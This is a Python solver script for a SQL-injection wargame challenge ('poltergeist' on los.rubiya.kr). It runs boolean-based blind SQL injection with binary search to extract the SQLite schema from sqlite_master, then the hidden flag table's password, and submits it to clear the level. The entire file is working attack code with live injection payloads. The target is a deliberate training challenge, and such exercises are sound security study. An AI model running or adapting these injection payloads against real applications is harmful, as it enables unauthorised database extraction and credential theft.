import requests
import os
import re

URL_ID=os.environ['URL_ID']
PHPSESSID=os.environ['PHPSESSID']

url = f"https://los.rubiya.kr/chall/poltergeist_{URL_ID}.php"
cookie = {'PHPSESSID': PHPSESSID}


ddl_length = 0

for  i in range(1, 250):

    res = requests.get(url, params={'pw': f'\' or {i} <= length((SELECT group_concat(sql) FROM sqlite_master)) --'},cookies=cookie)
    if res.text.find("Hello guest") > 0:
        ddl_length = i
    else:
        break

print(f"ddl length: {ddl_length}")

ddl = ""

for i in range(0, ddl_length):
    min_code = 0
    max_code = 256
    while min_code + 1 != max_code:
        target = (min_code + max_code) // 2
        res = requests.get(url, params={'pw': f'\' or id=\'admin\' and {target} <= unicode(substr((SELECT group_concat(sql) FROM sqlite_master),{i+1},1)) --'},cookies=cookie)

        if res.text.find("Hello admin") > 0:
            min_code = target
        else:
            max_code = target

    ddl += str(chr(min_code))
    print(f"(in progress)ddl: {ddl}")


flags =re.findall(r'`(flag_.+)`', ddl, re.M)
table_name = flags[0]
column_name = flags[1]
print(f"flags: {flags}")
print(f"table_name: {table_name}")
print(f"column_name: {column_name}")

pw_length = 0

for  i in range(1, 250):

    res = requests.get(url, params={'pw': f'\' or {i} <= length((SELECT group_concat({column_name}) FROM {table_name})) --'},cookies=cookie)
    if res.text.find("Hello guest") > 0:
        pw_length = i
    else:
        break

print(f"pw length: {pw_length}")

ans = ""

for i in range(0, pw_length):
    min_code = 0
    max_code = 256
    while min_code + 1 != max_code:
        target = (min_code + max_code) // 2
        res = requests.get(url, params={'pw': f'\' or id=\'admin\' and {target} <= unicode(substr((SELECT group_concat({column_name}) FROM {table_name}),{i+1},1)) --'},cookies=cookie)

        if res.text.find("Hello admin") > 0:
            min_code = target
        else:
            max_code = target

    ans += str(chr(min_code))
    print(f"(in progress)ans: {ans}")

res = requests.get(url, params={'pw': ans},cookies=cookie)

if res.text.find("Clear") > 0:
    print("Clear!")
else:
    print("Failed")


